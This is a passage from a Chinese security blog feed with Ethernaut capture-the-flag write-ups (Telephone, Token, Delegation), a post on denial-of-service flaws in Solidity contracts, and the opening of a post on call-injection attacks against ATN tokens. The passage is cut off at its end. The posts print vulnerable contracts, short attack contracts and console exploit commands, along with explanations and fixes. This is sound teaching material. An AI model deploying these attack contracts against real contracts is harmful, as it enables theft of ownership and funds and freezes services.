class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目要求获得合约所有权，可以看到只要满足<code>tx.origin != msg.sender</code>就行。在此介绍一下<code>tx.origin</code>：</p><blockquote><p>tx.origin是Solidity的一个全局变量，它遍历整个调用栈并返回最初发送调用（或事务）的帐户的地址。</p></blockquote><p><strong>在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</strong><br/><br>因为tx.origin是交易的原始发起者，而我们可以通过很多方式使得tx.origin作为智能合约的授权变得不可靠。</p><blockquote><p>举个例子：假设A、B、C都是已经部署的合约，如果我们用A去调用C，即A-&gt;C，那么在C合约看来，A既是tx.origin，又是msg.sender。如果调用链是A-&gt;B-&gt;C，那么对于合约C来说，A是tx.origin，B是msg.sender，即msg.sender是直接调用的一方，而tx.origin是交易的原始发起者</p></blockquote><ul><li><p>漏洞分析<br>在此题中，我们只需要写一个攻击合约，使攻击合约通过另一个地址去调用受攻击合约就行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Telephone t;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        t &#x3D; Telephone(_adr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t.changeOwner(0x100200fF289D4dA0634fF36d7f5D96524f7EFf67);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>总结：<br>tx.origin不应该用于智能合约的授权。更多的时候采用<code>msg.sender == owner</code>来进行判断。<br/><br>但它也有自己使用的场景，比如想要拒绝外部合约调用当前合约则可使用<code>require（tx.origin ==msg.sender）</code>来进行实现。</li></ul><h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>这是一个整数溢出的漏洞<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这个合约没有用到<code>SafeMath</code>那么我们就要格外关注是否存在整数溢出型的漏洞。<br>不出意外：在transfer方法中<code>require(balances[msg.sender] - _value &gt;= 0)</code>使明显存在整数下溢的风险的。<br/><br>由于题目中说到我们一开始拥有20个token，那我们只需要向此合约发出交易，<code>_value&gt;20</code>即可使<code>balances[msg.sender] - _value</code> 发生下溢变成一个很大的值从而符合判定条件。</p><ul><li>解题思路</li></ul><ol><li>在控制台调用transfer方法value为21即可<br><img src="08.png" alt=""></li><li>此时查看我们的账户余额已经是一个相当大的值<br><img src="09.png" alt=""></li><li>通关</li></ol></li></ul><h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>这道题考查对delegatecall()的认识<br>非常危险<br>先看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题目的是要拿到合约的所有权，阅读代码后，其实就是想要通过<code>Delegation</code>合约调用<code>Delegate</code>中的<code>pwn()</code>函数，即可完成对<code>owner</code>的修改</p><ul><li>漏洞分析<br>我们注意到<code>Delegation</code>中的fallback()函数有<code>address(delegate).delegatecall(msg.data);</code>出现，而关于delegatecall的有关介绍可以参考我的另一篇博文，我们可以知道delegatecall函数是非常危险的，而且历史上已经多次被用于进行 attack vector. 使用它。<br/><br>我们在这道题当中只需要给<code>Delegation</code>合约转账，触发他的<code>fallback</code>函数并通过函数签名的方式传入<code>data</code>即可</li></ul><p>解题步骤：</p><ol><li>执行<code>contract.sendTransaction({data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)});</code>给当前合约赚一笔帐并指定data<br><img src="10.png" alt=""></li><li>通关</li></ol>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务漏洞</title>
      <link href="/Denial-Service/"/>
      <url>/Denial-Service/</url>
      
        <content type="html"><![CDATA[<h1 id="合约中的拒绝服务漏洞："><a href="#合约中的拒绝服务漏洞：" class="headerlink" title="合约中的拒绝服务漏洞："></a>合约中的拒绝服务漏洞：</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="何为Dos"><a href="#何为Dos" class="headerlink" title="何为Dos"></a>何为Dos</h2><p>DoS 是DenialOfService，拒绝服务的缩写[3]，从字面上来理解，就是用户所需要的服务请求无法被系统处理。<br>打个比方来形容DoS，火车站是为大家提供乘车服务的，如果想要DoS火车站的话，方法有很多，可以占用过道不上车，堵住售票点不付钱，阻挠列车员或者司机不让开车，甚至用破坏铁轨等更加极端的手段来影响车站服务的正常运营。<br>过去针对互联网的DoS有很多种方法，但基本分为三大类：利用软件实现的缺陷，利用协议的漏洞，利用资源压制[3]。<br>此外还有DDoS，称为分布式DoS，其区别就是攻击者利用远程操控的计算机同时向目标发起进攻，在上面的比喻中可以理解为雇佣了几百个地痞流氓来做同样的事影响车站的运作。</p><h2 id="事件回顾"><a href="#事件回顾" class="headerlink" title="事件回顾"></a>事件回顾</h2><p>2016年2月6日至8日The King of the Ether Throne（以下简称KotET）“纷争时代”（Turbulent Age）期间，许多游戏中的退位君王的补偿和未接受款项无法退回用户玩家的钱包.<br>具有讽刺意味的是同年6月，连庞氏骗局GovernMental的合约也遭遇DoS攻击，当时1100以太币是通过使用250万gas交易获得[2]，这笔交易超出了合约能负荷的gas上限，带来交易活动的暂停。<br/><br>无论是蓄意破坏交易正常流程还是阻塞交易通道，都用到了一个互联网时代已经盛行已久的攻击方式——DoS，也就是我们所说的拒绝服务攻击。<br>这种攻击方式可以让合约执行的正常的交易操作被扰乱，中止，冻结，更严重的是让合约本身的逻辑无法运行</p><h2 id="已知漏洞的类型"><a href="#已知漏洞的类型" class="headerlink" title="已知漏洞的类型"></a>已知漏洞的类型</h2><ol><li>未设定gas费率的外部调用</li><li>依赖外部的调用进展</li><li>owner错误操作</li><li>数组或映射过长</li><li>逻辑设计错误</li><li>缺少依赖库</li></ol><h2 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h2><p>在合约中你可能想要通过call调用去执行某些东西的时候，因为未设定gas费率导致可能发生恶意的调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"> </span><br><span class="line">contract Denial &#123;</span><br><span class="line"> </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address payable public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"> </span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance.div(100);</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call.value(amountToSend)(&quot;&quot;);</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; now;</span><br><span class="line">        withdrawPartnerBalances[partner] &#x3D; withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    fallback() external payable &#123;&#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line"> </span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>或者assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address &#x3D; instance_address_here;</span><br><span class="line">    Denial target &#x3D; Denial(instance_address);</span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.setWithdrawPartner(address(this));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable public &#123;</span><br><span class="line">        assert(0&#x3D;&#x3D;1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解决方案<blockquote><p>使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h2 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h2><p>这类漏洞常见于竞拍的合约当中，你的想法是如果有人出价高于现阶段的价格，就把当前的竞拍者的token退还给他，再去更新竞拍者，殊不知transfer函数执行失败后，亦会使下面的步骤无法执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"> </span><br><span class="line">contract King &#123;</span><br><span class="line"> </span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"> </span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份，那就把合约的fallback函数不弄成payable就能一直不接受了。当然第一步是先成为King</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"> </span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    constructor(address target) public payable&#123;</span><br><span class="line">        target.call.gas(1000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;未定义fallback函数，就没有payable修饰</span><br></pre></td></tr></table></figure></blockquote></li><li>解决方案</li></ul><h2 id="owner错误操作"><a href="#owner错误操作" class="headerlink" title="owner错误操作"></a>owner错误操作</h2><p>本类型涉及到函数修饰关键词的使用，owner可以设定合约的当前状态，因为错误的操作使得当前合约的状态设置为不可交易，出现非主观的拒绝服务。将令牌系统理解为股市，有时需要进行休市操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"> </span><br><span class="line">contract error&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool activestatus;</span><br><span class="line"> </span><br><span class="line">    modifier onlyowner&#123;</span><br><span class="line">        require(msg.sender&#x3D;&#x3D;owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier active&#123;</span><br><span class="line">        require(activestatus);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function activecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    function inactivecontract() onlyowner&#123;</span><br><span class="line">        activestatus &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer() active&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果owner调用了inactivecontract函数，使得activestatus变成false</p><p>之后所有被active修饰的函数都无法调用，无法通过require判定</p><p>令牌生态系统的整个操作取决于一个地址，这是非常危险的</p><h2 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h2><p>本类型的漏洞存在于利益分发合约，类似于公司给股东的分红，但是由于以太坊区块有gas费率交易上限，如果数组过大会导致操作执行的gas远远超出上限，从而导致交易失败，也就无法分红<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract DistributeTokens &#123;</span><br><span class="line">    address public owner; &#x2F;&#x2F; gets set somewhere</span><br><span class="line">    address[] investors; &#x2F;&#x2F; array of investors</span><br><span class="line">    uint[] investorTokens; &#x2F;&#x2F; the amount of tokens each investor gets</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; ... extra functionality, including transfertoken()</span><br><span class="line"> </span><br><span class="line">    function invest() public payable &#123;</span><br><span class="line">        investors.push(msg.sender);</span><br><span class="line">        investorTokens.push(msg.value * 5); &#x2F;&#x2F; 5 times the wei sent</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    function distribute() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner); &#x2F;&#x2F; only owner</span><br><span class="line">        for(uint i &#x3D; 0; i &lt; investors.length; i++) &#123; </span><br><span class="line">            &#x2F;&#x2F; here transferToken(to,amount) transfers &quot;amount&quot; of tokens to the address &quot;to&quot;</span><br><span class="line">            transferToken(investors[i],investorTokens[i]); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该漏洞的另一个关键点在于循环遍历的数组可以被人为扩充<br>在distribute()函数中使用的循环数组的扩充在invert()函数里面，但是invert()函数是public属性，也就意味着可以创建很多的用户账户，让数组变得非常大，从而使distribute()函数因为超出以太坊区块gas费率上限而无法成功执行</p><h2 id="依赖库问题"><a href="#依赖库问题" class="headerlink" title="依赖库问题"></a>依赖库问题</h2><p>依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。</p><p>万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><p>Parity 钱包遭受的第二次攻击是一个很好的例子。</p><p>Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。</p><p>库合约本质上也不过是另外一个智能合约，这次攻击调用使用的是库合约本身的上下文，对调用者而言这个库合约是未经初始化的。</p><ul><li><p>攻击流程</p><p>1.攻击者调用初始化函数把自己设置为库合约的 owner。</p><p>2.攻击者调用 kill() 函数，把库合约删除，所有的 ether 就被冻结了</p></li><li>解决方案<br>继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</li></ul><h2 id="逻辑设计错误"><a href="#逻辑设计错误" class="headerlink" title="逻辑设计错误"></a>逻辑设计错误</h2><p>本类型漏洞分析Edgeware锁仓合约的拒绝服务漏洞</p><p>Edgeware锁仓合约可以理解为你往银行里定期存款，之后会给你收益，关键点在于发送token后要进行lock操作，把你的资金锁起来，暂时无法提现，本类型漏洞会导致参与者lock失败，从而无法获得收益。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function lock(Term term, bytes calldata edgewareAddr, bool isValidator)</span><br><span class="line">        external</span><br><span class="line">        payable</span><br><span class="line">        didStart</span><br><span class="line">        didNotEnd</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 eth &#x3D; msg.value;</span><br><span class="line">        address owner &#x3D; msg.sender;</span><br><span class="line">        uint256 unlockTime &#x3D; unlockTimeForTerm(term);</span><br><span class="line">        &#x2F;&#x2F; Create ETH lock contract</span><br><span class="line">        Lock lockAddr &#x3D; (new Lock).value(eth)(owner, unlockTime);</span><br><span class="line">        &#x2F;&#x2F; ensure lock contract has at least all the ETH, or fail</span><br><span class="line">        assert(address(lockAddr).balance &gt;&#x3D; msg.value);</span><br><span class="line">        emit Locked(owner, eth, lockAddr, term, edgewareAddr, isValidator, now);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这段代码做了强制判断:<br><code>assert(address(lockAddr).balance &gt;= msg.value);</code><br>属于参与者的 Lock 合约的金额必须等于参与者锁仓时发送的金额，如果不等于，意味着 lock 失败，这个失败会导致参与者的 Lock 合约“瘫痪”而形成“拒绝服务”，直接后果就是：假如攻击持续着，Edgeware 这个 Lockdrop 机制将不再可用。 但这个漏洞对参与者的资金无影响。那么，什么情况下会导致“address(lockAddr).balance 不等于 msg.value” 攻击者如果能提前推测出参与者的 Lock 合约地址就行（这在以太坊黄皮书里有明确介绍，可以计算出来），此时攻击者只需提前往参与者的 Lock 合约地址随便转点 ETH 就好，就会导致参与者无法lock从而无法获取收益</p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Call注入漏洞</title>
      <link href="/CallAttack/"/>
      <url>/CallAttack/</url>
      
        <content type="html"><![CDATA[<h1 id="Call注入漏洞刷题实践"><a href="#Call注入漏洞刷题实践" class="headerlink" title="Call注入漏洞刷题实践"></a>Call注入漏洞刷题实践</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>写本文是为了总结一下博主在这两天中做一个靶场题目时遇到的一些问题，以及对call注入的一些见解。</p><h2 id="Call函数"><a href="#Call函数" class="headerlink" title="Call函数"></a>Call函数</h2><p>首先我们先了解一下call函数：<br/><br>合约之间的调用有2种方式： 底层的call方式和 new 合约的方式<br/><br>solidity 提供了 call()、delegatecall()、callcode() 三个函数来实现合约直接的调用及交互，这些函数的滥用导致了各种安全风险和漏洞。在使用第二种方式时，如果处理不当很可能产生致命的漏洞 —— 跨合约调用漏洞，主要就是 call() 注入函数导致的.</p><p>call() 函数对某个合约或者本地合约的某个方法的调用方式：</p><ul><li><code>&lt;address&gt;.call(方法选择器,arg1,arg2,...)</code></li><li><code>&lt;address&gt;.call(bytes)</code><blockquote><p>综上  合约之间的调用建议的方式是：通过new 合约，通过合约的方式去调用，而不是通过call的方式去调用，因为这样会失去控制权。<br/></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>接下来我们通过一个call注入攻击的案例来更深入的了解一下call函数:<br>2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。</p></blockquote></li></ul><p>ATN Token合约采用的是在传统ERC20Token合约基础上的扩展版本ERC223，并在其中使用了 dapphub/ds-auth 库。<br>单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。<br/><br>ERC223转账代码如下：<br><img src="/exm1.png" alt=""><br>黑客转账时在方法中输入了以下参数成功实现了攻击：<br><img src="/exm2.png" alt=""><br>该交易执行的时候 receiver 会被 <em>to(ATN合约地址) 赋值， ATN 合约会调用 _custom_fallback 即 DSAuth 中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，owner</em>参数为_from(黑客地址)。<br/><br>ds-auth库中setOwner 代码如下：<br><img src="/exm3.png" alt=""><br>在执行 <code>setOwner</code> 时会先验证 auth 合法性，而此时！ msg.sender 就是ATN的合约地址，因此完美的避开了auth的检查。setOwner 的 modifier auth 代码：<br><img src="/exm4.png" 